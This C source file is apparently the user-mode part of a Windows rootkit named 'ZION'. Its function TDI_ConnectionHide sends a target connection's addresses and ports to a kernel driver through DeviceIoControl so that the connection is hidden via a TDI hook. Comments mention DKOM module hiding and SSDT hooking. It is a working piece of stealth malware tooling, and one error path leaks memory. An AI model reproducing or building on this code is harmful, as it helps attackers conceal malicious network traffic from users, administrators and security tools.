/*
 *      name: ZION system tdi hook user
 *      Org Author: Liang Chen
 *      Version : 0.2
 */
#include "zion_tdi_connection.h"



STD_EXPORT(ZIONRESULT) TDI_ConnectionHide(DWORD Type,DWORD SrcAddr,USHORT SrcPort,DWORD DstAddr,USHORT DstPort)
{
	PZION_CS_PACKET ptrZION_TDI_Packet;
	PZION_TDI_CONNECTION_CMD_DATA ptrTDIData;
	ptrZION_TDI_Packet = (PZION_CS_PACKET)malloc(sizeof(ZION_CS_PACKET));
	if (NULL == ptrZION_TDI_Packet)
	{
		printf("ZION: Memory alloc failed in TDI_ConnectionHide\n");
		return ZION_MEMORY_ALLOC_FAIL;
	}

	ptrTDIData = (PZION_TDI_CONNECTION_CMD_DATA)malloc(sizeof(ZION_TDI_CONNECTION_CMD_DATA));
	if (NULL == ptrTDIData)
	{
		printf("ZION: Memory alloc failed in TDI_ConnectionHide\n");
		return ZION_MEMORY_ALLOC_FAIL;
	}
	if (ZION_OK != SetTDIData(ptrTDIData,
							   Type,
							   SrcAddr,
							   SrcPort,
							   DstAddr,
							   DstPort))
	{
		printf("ZION: Error in TDI_ConnectionHide\n");
		return ZION_ERROR;
	}
	if (ZION_OK != ZION_SetPacketValue(ptrZION_TDI_Packet,
		CMD_TDI_CONNECTION,
		ptrTDIData,
		sizeof(ZION_TDI_CONNECTION_CMD_DATA)))
	{
		printf("ZION: Error in TDI_ConnectionHide\n");
		return ZION_ERROR;
	}

	DWORD dwReceived;
	//Maybe need to judge whether g_hZionServer_Dev is NULL
	if (!DeviceIoControl(g_hZionServer_Dev,
		IOCTL_ZION_CS_PKT_CMD,
		(LPVOID) ptrZION_TDI_Packet,
		sizeof(ZION_CS_PACKET),
		NULL,
		0,
		&dwReceived,
		NULL))
	{
		printf("ZION: Device IO CTRL Error in TDI_ConnectionHide\n");
		free(ptrZION_TDI_Packet);
		free(ptrTDIData);
		return ZION_ERROR;
	}
	//printf("ZION: DKOM HIDE MODULE %s Succeed\n", DriverFileName);
	free(ptrZION_TDI_Packet);
	free(ptrTDIData);
	return ZION_OK;
	//ZION_SetPacketValue(ptrZION_SSDT_Packet, CMD_SSDT_HOOK, 
}
ZIONRESULT SetTDIData(PZION_TDI_CONNECTION_CMD_DATA data,
							   DWORD Type,
							   DWORD SrcAddr,
							   USHORT SrcPort,
							   DWORD DstAddr,
							   USHORT DstPort)
{
	data->DstAddr = DstAddr;
	data->DstPort = DstPort;
	data->SrcAddr = SrcAddr;
	data->SrcPort = SrcPort;
	data->Type = Type;
	return ZION_OK;
}